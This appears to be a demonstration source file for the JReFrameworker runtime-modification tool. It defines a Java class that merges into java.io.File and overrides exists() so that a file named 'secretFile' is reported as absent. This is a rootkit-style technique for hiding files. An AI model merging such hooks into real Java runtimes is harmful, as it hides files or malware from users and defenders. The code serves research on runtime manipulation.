package jref.java.io;

import java.io.File;

import com.jreframeworker.annotations.methods.MergeMethod;
import com.jreframeworker.annotations.types.MergeType;

@MergeType
public class HiddenFile extends File {

	private static final long serialVersionUID = 1L;

	public HiddenFile(String pathname) {
		super(pathname);
	}
	
	@MergeMethod
	@Override
	public boolean exists() {
		if(this.getName().equals("secretFile")) {
			return false;
		} else {
			return super.exists();
		}
	}

}
